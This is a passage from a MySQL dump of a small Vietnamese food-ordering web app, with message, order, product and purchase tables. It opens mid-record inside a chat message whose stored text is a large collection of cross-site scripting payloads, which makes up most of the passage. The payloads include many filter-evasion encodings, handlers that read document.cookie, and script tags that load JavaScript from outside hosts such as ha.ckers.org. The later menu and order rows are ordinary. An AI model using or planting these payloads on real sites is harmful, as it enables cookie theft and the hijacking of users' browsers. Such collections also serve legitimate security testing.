SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> <IMG SRC=\"jav ascript:alert(\'XSS\');\"> <IMG SRC=\"jav&#x09;ascript:alert(\'XSS\');\"> <IMG SRC=\"jav&#x0A;ascript:alert(\'XSS\');\"> <IMG SRC=\"jav&#x0D;ascript:alert(\'XSS\');\"> perl -e \'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";\' > out <IMG SRC=\" &#14;  javascript:alert(\'XSS\');\"> <SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT> <BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")> <SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT> <<SCRIPT>alert(\"XSS\");//<</SCRIPT> <SCRIPT SRC=http://ha.ckers.org/xss.js?< B > <SCRIPT SRC=//ha.ckers.org/.j> <IMG SRC=\"javascript:alert(\'XSS\')\" <iframe src=http://ha.ckers.org/scriptlet.html < \\\";alert(\'XSS\');// </TITLE><SCRIPT>alert(\"XSS\");</SCRIPT> <INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert(\'XSS\');\"> <BODY BACKGROUND=\"javascript:alert(\'XSS\')\"> <IMG DYNSRC=\"javascript:alert(\'XSS\')\"> <IMG LOWSRC=\"javascript:alert(\'XSS\')\"> <STYLE>li {list-style-image: url(\"javascript:alert(\'XSS\')\");}</STYLE><UL><LI>XSS</br> <IMG SRC=\'vbscript:msgbox(\"XSS\")\'> <IMG SRC=\"livescript:[code]\"> <BODY ONLOAD=alert(\'XSS\')> <BGSOUND SRC=\"javascript:alert(\'XSS\');\"> <BR SIZE=\"&{alert(\'XSS\')}\"> <LINK REL=\"stylesheet\" HREF=\"javascript:alert(\'XSS\');\"> <LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\"> <STYLE>@import\'http://ha.ckers.org/xss.css\';</STYLE> <META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\"> <STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE> <STYLE>@im\\port\'\\ja\\vasc\\ript:alert(\"XSS\")\';</STYLE> <IMG STYLE=\"xss:expr/*XSS*/ession(alert(\'XSS\'))\"> exp/*<A STYLE=\'no\\xss:noxss(\"*//*\");xss:ex/*XSS*//*/*/pression(alert(\"XSS\"))\'> <STYLE TYPE=\"text/javascript\">alert(\'XSS\');</STYLE> <STYLE>.XSS{background-image:url(\"javascript:alert(\'XSS\')\");}</STYLE><A CLASS=XSS></A> <STYLE type=\"text/css\">BODY{background:url(\"javascript:alert(\'XSS\')\")}</STYLE> <STYLE type=\"text/css\">BODY{background:url(\"javascript:alert(\'XSS\')\")}</STYLE> <XSS STYLE=\"xss:expression(alert(\'XSS\'))\"> <XSS STYLE=\"behavior: url(xss.htc);\"> ¼script¾alert(¢XSS¢)¼/script¾ <META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(\'XSS\');\"> <META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"> <META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert(\'XSS\');\"> <IFRAME SRC=\"javascript:alert(\'XSS\');\"></IFRAME> <IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME> <FRAMESET><FRAME SRC=\"javascript:alert(\'XSS\');\"></FRAMESET> <TABLE BACKGROUND=\"javascript:alert(\'XSS\')\"> <TABLE><TD BACKGROUND=\"javascript:alert(\'XSS\')\"> <DIV STYLE=\"background-image: url(javascript:alert(\'XSS\'))\"> <DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028\'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029\'\\0029\"> <DIV STYLE=\"background-image: url(&#1;javascript:alert(\'XSS\'))\"> <DIV STYLE=\"width: expression(alert(\'XSS\'));\"> <BASE HREF=\"javascript:alert(\'XSS\');//\">  <OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT> <EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED> <SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT> <!--#exec cmd=\"/bin/echo \'<SCR\'\"--><!--#exec cmd=\"/bin/echo \'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>\'\"--> <? echo(\'<SCR)\';echo(\'IPT>alert(\"XSS\")</SCRIPT>\'); ?> <IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\"> Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser <META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>\">  <HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert(\'XSS\');+ADw-/SCRIPT+AD4- <SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT> <SCRIPT =\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT> <SCRIPT a=\">\" \'\' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT> <SCRIPT \"a=\'>\'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT> <SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT> <SCRIPT a=\">\'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT> <SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT> <A HREF=\"http://66.102.7.147/\">XSS</A> <A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A> <A HREF=\"http://1113982867/\">XSS</A> <A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A> <A HREF=\"http://0102.0146.0007.00000223/\">XSS</A> <A HREF=\"htt p://6 6.000146.0x7.147/\">XSS</A> <iframe  src=\"&Tab;javascript:prompt(1)&Tab;\"> <svg><style>{font-family&colon;\'<iframe/onload=confirm(1)>\' <input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\" <sVg><scRipt >alert&lpar;1&rpar; {Opera} <img/src=`` onerror=this.onerror=confirm(1)  <form><isindex formaction=\"javascript&colon;confirm(1)\" <img src=``&NewLine; onerror=alert(1)&NewLine; <script/&Tab; src=\'https://dl.dropbox.com/u/13018058/js.js\' /&Tab;></script> <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=? <iframe/src=\"data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\"> <script /**/>/**/alert(1)/**/</script /**/ &#34;&#62;<h1/onmouseover=\'\\u0061lert(1)\'> <iframe/src=\"data:text/html,<svg &#111;&#110;load=alert(1)>\"> <meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/> <svg><script xlink:href=data&colon;,window.open(\'https://www.google.com/\')></script <svg><script x:href=\'https://dl.dropbox.com/u/13018058/js.js\' {Opera} <meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\"> <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;> <form><a href=\"javascript:\\u0061lert&#x28;1&#x29;\">X </script><img/*/src=\"worksinchrome&colon;prompt&#x28;1&#x29;\"/*/onerror=\'eval(src)\'> <img/&#09;&#10;&#11; src=`~` onerror=prompt(1)> <form><iframe &#09;&#10;&#11; src=\"javascript&#58;alert(1)\"&#11;&#10;&#09;;> <a href=\"data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&#09;&#10;&#11;>X</a http://www.google<script .com>alert(document.location)</script <a&#32;href&#61;&#91;&#00;&#93;\"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;\">XYZ</a <img/src=@&#32;&#13; onerror = prompt(\'&#49;\') <style/onload=prompt&#40;\'&#88;&#83;&#83;\'&#41; <script ^__^>alert(String.fromCharCode(49))</script ^__^ </style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-( &#00;</form><input type&#61;\"date\" onfocus=\"alert(1)\"> <form><textarea &#13; onkeyup=\'\\u0061\\u006C\\u0065\\u0072\\u0074&#x28;1&#x29;\'> <script /***/>/***/confirm(\'\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450\')/***/</script /***/ <iframe srcdoc=\'&lt;body onload=prompt&lpar;1&rpar;&gt;\'> <a href=\"javascript:void(0)\" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a> <script ~~~>alert(0%0)</script ~~~> <style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;> <///style///><span %2F onmousemove=\'alert&lpar;1&rpar;\'>SPAN <img/src=\'http://i.imgur.com/P8mL8.jpg\' onmouseover=&Tab;prompt(1) &#34;&#62;<svg><style>{-o-link-source&colon;\'<body/onload=confirm(1)>\' &#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera} <marquee onstart=\'javascript:alert&#x28;1&#x29;\'>^__^ <div/style=\"width:expression(confirm(1))\">X</div> {IE7} <iframe// src=javaSCRIPT&colon;alert(1) //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type=\'submit\'>// /*iframe/src*/<iframe/src=\"<iframe/src=@\"/onload=prompt(1) /*iframe/src*/> //|\\\\ <script //|\\\\ src=\'https://dl.dropbox.com/u/13018058/js.js\'> //|\\\\ </script //|\\\\ </font>/<svg><style>{src&#x3A;\'<style/onload=this.onload=confirm(1)>\'</font>/</style> <a/href=\"javascript:&#13; javascript:prompt(1)\"><input type=\"X\"> </plaintext\\></|\\><plaintext/onmouseover=prompt(1) </svg>\'\'<svg><script \'AQuickBrownFoxJumpsOverTheLazyDog\'>alert&#x28;1&#x29; {Opera} <a href=\"javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;\"><button> <div onmouseover=\'alert&lpar;1&rpar;\'>DIV</div> <iframe style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\"> <a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X</a> <embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"> <object data=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"> <var onmouseover=\"prompt(1)\">On Mouse Over</var> <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a> <img src=\"/\" =_=\" title=\"onerror=\'prompt(1)\'\"> <%<!--\'%><script>alert(1);</script --> <script src=\"data:text/javascript,alert(1)\"></script> <iframe/src \\/\\/onload = prompt(1) <iframe/onreadystatechange=alert(1) <svg/onload=alert(1) <input value=<><iframe/src=javascript:confirm(1) <input type=\"text\" value=`` <div/onmouseover=\'alert(1)\'>X</div> <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe> <img src=`xx:xx`onerror=alert(1)> <object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object> <meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/> <math><a xlink:href=\"//jsfiddle.net/t846h/\">click <embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always> <svg contentScriptType=text/vbs><script>MsgBox+1 <a href=\"data:text/html;base64_,<svg/onload=\\u0061&#x6C;&#101%72t(1)>\">X</a <iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074(\'\\u0061\') worksinIE> <script>~\'\\u0061\' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~\'\\u0061\')</script U+ <script/src=\"data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert(\'\\u0061\')\"></script a=\\u0061 & /=%2F <script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/XSS/)></script <object data=javascript&colon;\\u0061&#x6C;&#101%72t(1)> <script>+-+-1-+-+alert(1)</script> <body/onload=&lt;!--&gt;&#10alert(1)> <script itworksinallbrowsers>/*<script* */alert(1)</script <img src ?itworksonchrome?\\/onerror = alert(1) <svg><script>//&NewLine;confirm(1);</script </svg> <svg><script onlypossibleinopera:-)> alert(1) <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe <script x> alert(1) </script 1=2 <div/onmouseover=\'alert(1)\'> style=\"x:\"> <--`<img/src=` onerror=alert(1)> --!> <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> <div style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\" onclick=\"alert(1)\">x</button> \"><img src=x onerror=window.open(\'https://www.google.com/\');> <form><button formaction=javascript&colon;alert(1)>CLICKME <math><a xlink:href=\"//jsfiddle.net/t846h/\">click <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object> <iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe> <a href=\"data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203\">Click Me</a>  \'\';!--\"<XSS>=&{()} \'>//\\\\,<\'>\">\">\"*\" \'); alert(\'XSS <script>alert(1);</script> <script>alert(\'XSS\');</script> <IMG SRC=\"javascript:alert(\'XSS\');\"> <IMG SRC=javascript:alert(\'XSS\')> <IMG SRC=javascript:alert(\'XSS\')> <IMG SRC=javascript:alert(&quot;XSS&quot;)> <IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"> <scr<script>ipt>alert(\'XSS\');</scr</script>ipt> <script>alert(String.fromCharCode(88,83,83))</script>  <img src=foo.png onerror=alert(/xssed/) /> <style>@im\\port\'\\ja\\vasc\\ript:alert(\\\"XSS\\\")\';</style> <? echo(\'<scr)\'; echo(\'ipt>alert(\\\"XSS\\\")</script>\'); ?> <marquee><script>alert(\'XSS\')</script></marquee> <IMG SRC=\\\"jav&#x09;ascript:alert(\'XSS\');\\\"> <IMG SRC=\\\"jav&#x0A;ascript:alert(\'XSS\');\\\"> <IMG SRC=\\\"jav&#x0D;ascript:alert(\'XSS\');\\\"> <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> \"><script>alert(0)</script> <script src=http://yoursite.com/your_files.js></script> </title><script>alert(/xss/)</script> </textarea><script>alert(/xss/)</script> <IMG LOWSRC=\\\"javascript:alert(\'XSS\')\\\"> <IMG DYNSRC=\\\"javascript:alert(\'XSS\')\\\"> <font style=\'color:expression(alert(document.cookie))\'> <img src=\"javascript:alert(\'XSS\')\"> <script language=\"JavaScript\">alert(\'XSS\')</script> <body onunload=\"javascript:alert(\'XSS\');\"> <body onLoad=\"alert(\'XSS\');\" [color=red\' onmouseover=\"alert(\'xss\')\"]mouse over[/color] \"/></a></><img src=1.gif onerror=alert(1)> window.alert(\"Bonjour !\"); <div style=\"x:expression((window.r==1)?\'\':eval(\'r=1; alert(String.fromCharCode(88,83,83));\'))\"> <iframe<?php echo chr(11)?> onload=alert(\'XSS\')></iframe> \"><script alert(String.fromCharCode(88,83,83))</script> \'>><marquee><h1>XSS</h1></marquee> \'\">><script>alert(\'XSS\')</script> \'\">><marquee><h1>XSS</h1></marquee> <META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0;url=javascript:alert(\'XSS\');\\\"> <META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0; URL=http://;URL=javascript:alert(\'XSS\');\\\"> <script>var var = 1; alert(var)</script> <STYLE type=\"text/css\">BODY{background:url(\"javascript:alert(\'XSS\')\")}</STYLE> <?=\'<SCRIPT>alert(\"XSS\")</SCRIPT>\'?> <IMG SRC=\'vbscript:msgbox(\\\"XSS\\\")\'> \" onfocus=alert(document.domain) \"> <\" <FRAMESET><FRAME SRC=\\\"javascript:alert(\'XSS\');\\\"></FRAMESET> <STYLE>li {list-style-image: url(\\\"javascript:alert(\'XSS\')\\\");}</STYLE><UL><LI>XSS perl -e \'print \\\"<SCR\\0IPT>alert(\\\"XSS\\\")</SCR\\0IPT>\\\";\' > out perl -e \'print \\\"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\\\";\' > out <br size=\\\"&{alert(\'XSS\')}\\\"> <scrscriptipt>alert(1)</scrscriptipt> </br style=a:expression(alert())> </script><script>alert(1)</script> \"><BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")> [color=red width=expression(alert(123))][color] <BASE HREF=\"javascript:alert(\'XSS\');//\"> Execute(MsgBox(chr(88)&chr(83)&chr(83)))< \"></iframe><script>alert(123)</script> <body onLoad=\"while(true) alert(\'XSS\');\"> \'\"></title><script>alert(1111)</script> </textarea>\'\"><script>alert(document.cookie)</script> \'\"\"><script language=\"JavaScript\"> alert(\'X \\nS \\nS\');</script> </script></script><<<<script><>>>><<<script>alert(123)</script> <html><noalert><noscript>(123)</noscript><script>(123)</script> <INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert(\'XSS\');\"> \'></select><script>alert(123)</script> \'>\"><script src = \'http://www.site.com/XSS.js\'></script> }</style><script>a=eval;b=alert;a(b(/XSS/.source));</script> <SCRIPT>document.write(\"XSS\");</SCRIPT> a=\"get\";b=\"URL\";c=\"javascript:\";d=\"alert(\'xss\');\";eval(a+b+c+d); =\'><script>alert(\"xss\")</script> <script+src=\">\"+src=\"http://yoursite.com/xss.js?69,69\"></script> <body background=javascript:\'\"><script>alert(navigator.userAgent)</script>></body> \">/XaDoS/><script>alert(document.cookie)</script><script src=\"http://www.site.com/XSS.js\"></script> \">/KinG-InFeT.NeT/><script>alert(document.cookie)</script> src=\"http://www.site.com/XSS.js\"></script> data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4= !--\" /><script>alert(\'xss\');</script> <script>alert(\"XSS by \\nxss\")</script><marquee><h1>XSS by xss</h1></marquee> \"><script>alert(\"XSS by \\nxss\")</script>><marquee><h1>XSS by xss</h1></marquee> \'\"></title><script>alert(\"XSS by \\nxss\")</script>><marquee><h1>XSS by xss</h1></marquee> <img \"\"\"><script>alert(\"XSS by \\nxss\")</script><marquee><h1>XSS by xss</h1></marquee> <script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee> \"><script>alert(1337)</script>\"><script>alert(\"XSS by \\nxss</h1></marquee> \'\"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee> <iframe src=\"javascript:alert(\'XSS by \\nxss\');\"></iframe><marquee><h1>XSS by xss</h1></marquee> \'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src=\"\" alt=\' \"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src=\"\" alt=\" \\\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src=\"\" alt=\\\' http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS?? http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS?? \'); alert(\'xss\'); var x=\' \\\\\'); alert(\\\'xss\\\');var x=\\\' //--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83)); >\"><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt> <img src=\"Mario Heiderich says that svg SHOULD not be executed trough image tags\" onerror=\"javascript:document.write(\'\\u003c\\u0069\\u0066\\u0072\\u0061\\u006d\\u0065\\u0020\\u0073\\u0072\\u0063\\u003d\\u0022\\u0064\\u0061\\u0074\\u0061\\u003a\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0073\\u0076\\u0067\\u002b\\u0078\\u006d\\u006c\\u003b\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002c\\u0050\\u0048\\u004e\\u0032\\u005a\\u0079\\u0042\\u0034\\u0062\\u0057\\u0078\\u0075\\u0063\\u007a\\u0030\\u0069\\u0061\\u0048\\u0052\\u0030\\u0063\\u0044\\u006f\\u0076\\u004c\\u0033\\u0064\\u0033\\u0064\\u0079\\u0035\\u0033\\u004d\\u0079\\u0035\\u0076\\u0063\\u006d\\u0063\\u0076\\u004d\\u006a\\u0041\\u0077\\u004d\\u0043\\u0039\\u007a\\u0064\\u006d\\u0063\\u0069\\u0050\\u0069\\u0041\\u0067\\u0043\\u0069\\u0041\\u0067\\u0049\\u0044\\u0078\\u0070\\u0062\\u0057\\u0046\\u006e\\u005a\\u0053\\u0042\\u0076\\u0062\\u006d\\u0078\\u0076\\u0059\\u0057\\u0051\\u0039\\u0049\\u006d\\u0046\\u0073\\u005a\\u0058\\u004a\\u0030\\u004b\\u0044\\u0045\\u0070\\u0049\\u006a\\u0034\\u0038\\u004c\\u0032\\u006c\\u0074\\u0059\\u0057\\u0064\\u006c\\u0050\\u0069\\u0041\\u0067\\u0043\\u0069\\u0041\\u0067\\u0049\\u0044\\u0078\\u007a\\u0064\\', 1585540021, 0);
INSERT INTO `message` (`id`, `sender_id`, `receiver_id`, `message`, `timestamp`, `checked`) VALUES
(47, 9, 10, 'hi', 1587523075, 0),
(48, 9, 10, 'solo yasou?', 1590294901, 0);

-- --------------------------------------------------------

--
-- Table structure for table `orders`
--

CREATE TABLE `orders` (
  `id` int(11) NOT NULL,
  `order_id` int(11) NOT NULL,
  `vendor_id` int(11) NOT NULL,
  `customer_id` int(11) NOT NULL,
  `product_id` int(11) NOT NULL,
  `quantity` int(11) NOT NULL,
  `timestamp_order` int(11) NOT NULL,
  `timestamp_finish` int(11) NOT NULL DEFAULT '-1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_vietnamese_ci;

--
-- Dumping data for table `orders`
--

INSERT INTO `orders` (`id`, `order_id`, `vendor_id`, `customer_id`, `product_id`, `quantity`, `timestamp_order`, `timestamp_finish`) VALUES
(17, 8, 20, 9, 23, 1, 1592908949, -1),
(18, 8, 20, 9, 15, 1, 1592908949, -1),
(19, 9, 20, 18, 22, 1, 1592968402, -1),
(20, 10, 20, 19, 14, 7, 1593324545, -1);

-- --------------------------------------------------------

--
-- Table structure for table `product`
--

CREATE TABLE `product` (
  `product_id` int(11) NOT NULL,
  `category_id` int(1) NOT NULL,
  `product_name` varchar(30) COLLATE utf8_vietnamese_ci NOT NULL,
  `description` text COLLATE utf8_vietnamese_ci NOT NULL,
  `price` double NOT NULL,
  `photo` varchar(150) COLLATE utf8_vietnamese_ci NOT NULL,
  `vendor_id` int(11) NOT NULL,
  `is_ready` int(11) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_vietnamese_ci;

--
-- Dumping data for table `product`
--

INSERT INTO `product` (`product_id`, `category_id`, `product_name`, `description`, `price`, `photo`, `vendor_id`, `is_ready`) VALUES
(14, 2, 'Com Suon', '', 35000, 'assets/img/product/14.jpg', 20, 1),
(15, 2, 'Pho', '', 40000, 'assets/img/product/15.jpg', 20, 1),
(16, 3, 'Bun Bo Hue', '', 35000, 'assets/img/product/16.jpg', 20, 1),
(18, 4, 'Mojito', '', 25000, 'assets/img/product/18.jpg', 20, 1),
(20, 2, 'Com Chien', '', 35000, 'assets/img/product/20.jpg', 20, 1),
(21, 1, 'Chao', '', 30000, 'assets/img/product/21.jpg', 20, 1),
(22, 1, 'Bún Riêu', 'Ngon cực kì', 35000, 'assets/img/product/22.jpg', 20, 1),
(23, 4, 'Coca-Cola', '', 12000, 'assets/img/product/23.jpg', 20, 1),
(33, 2, 'Cháo gà', 'Chào gà ăn sáng nhé', 32000, 'assets/img/product/33.jpg', 20, 1),
(36, 14, 'Tiramisu', 'Tiramisu (from the Italian language, spelled tiramisù, [ˌtiramiˈsu], meaning \"pick me up\" or \"cheer me up\") is a coffee-flavoured Italian dessert. It is made of ladyfingers (savoiardi) dipped in coffee, layered with a whipped mixture of eggs, sugar and mascarpone cheese, flavoured with cocoa.', 25000, 'assets/img/product/36.jpeg', 23, 1),
(37, 14, 'Mint-Oreo', 'Mint Oreo Cheesecake is made with an Oreo crust filled with chopped mint Oreos, chocolate sauce and mint cheesecake! It\'s a mint chocolate lover\'s dream!', 20000, 'assets/img/product/37.jpeg', 23, 1),
(38, 14, 'Doughnut', 'A small cake of sweetened or, sometimes, unsweetened dough fried in deep fat, typically shaped like a ring or, when prepared with a filling, a ball.', 15000, 'assets/img/product/38.jpeg', 23, 1),
(39, 15, 'Snack Mực', '', 5000, 'assets/img/product/39.jpg', 23, 1),
(40, 15, 'Snack Bắp Ngọt', '', 5000, 'assets/img/product/40.jpg', 23, 1),
(41, 15, 'Snack Toonies', '', 10000, 'assets/img/product/41.jpg', 23, 1),
(42, 16, 'Caramel Macchiato', 'Freshly steamed milk with vanilla-flavored syrup marked with espresso and topped with a caramel drizzle for an oh-so-sweet finish.', 20000, 'assets/img/product/42.jpg', 23, 1),
(43, 16, 'Latte Coffee', 'Caffè latte is a coffee-based drink made primarily from espresso and steamed milk. It consists of one-third espresso, two-thirds heated milk and about 1cm of foam. Depending on the skill of the barista, the foam can be poured in such a way to create a picture.', 20000, 'assets/img/product/43.jpg', 23, 1),
(44, 17, 'Súp cua', 'Súp ngon thơm lừng nấu với cua và cua', 30000, 'assets/img/product/44.png', 24, 1),
(45, 17, 'Bắp xào', 'Bắp xào chất lượng cao', 20000, 'assets/img/product/45.jpg', 24, 1),
(46, 18, 'Bánh trán trộn', '', 10000, 'assets/img/product/46.png', 24, 1),
(47, 18, 'Bánh bèo', '', 15000, 'assets/img/product/47.jpg', 24, 1),
(48, 18, 'Bò bía', '', 20000, 'assets/img/product/48.jpg', 24, 1),
(49, 17, 'Bún đậu', '', 30000, 'assets/img/product/49.jpg', 24, 1),
(50, 19, 'Trà chanh', '', 10000, 'assets/img/product/50.jpg', 24, 1),
(53, 19, 'Nước sấu', '', 10000, 'assets/img/product/53.jpg', 24, 1),
(54, 20, 'Latte', '', 20000, 'assets/img/product/54.jpg', 25, 1),
(55, 20, 'Espresso', '', 20000, 'assets/img/product/55.jpg', 25, 1),
(56, 20, 'Mocha', '', 25000, 'assets/img/product/56.jpg', 25, 1),
(57, 20, 'Cappuccino', '', 25000, 'assets/img/product/57.jpg', 25, 1),
(58, 21, 'Trà chanh', '', 15000, 'assets/img/product/58.jpg', 25, 1),
(59, 21, 'Trà sen', '', 25000, 'assets/img/product/59.jpg', 25, 1),
(60, 21, 'Trà hoa quả', '', 25000, 'assets/img/product/60.jpg', 25, 1),
(61, 21, 'Trà ô long', '', 20000, 'assets/img/product/61.jpg', 25, 1),
(62, 22, 'Trà phô mai sữa', '', 30000, 'assets/img/product/62.jpg', 25, 1),
(63, 22, 'Sữa tươi trân châu đường đen', '', 40000, 'assets/img/product/63.jpeg', 25, 1);

-- --------------------------------------------------------

--
-- Table structure for table `purchase`
--

CREATE TABLE `purchase` (
  `purchaseid` int(11) NOT NULL,
  `customer` varchar(50) COLLATE utf8_vietnamese_ci NOT NULL,
  `total` double NOT NULL,
  `date_purchase` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_vietnamese_ci;

--
-- Dumping data for table `purchase`
--

INSERT INTO `purchase` (`purchaseid`, `customer`, `total`, `date_purchase`) VALUES
(8, 'Neovic', 600, '2017-12-06 15:29:00'),
(9, 'demo', 450, '2018-10-09 20:19:43');

-- --------------------------------------------------------

--
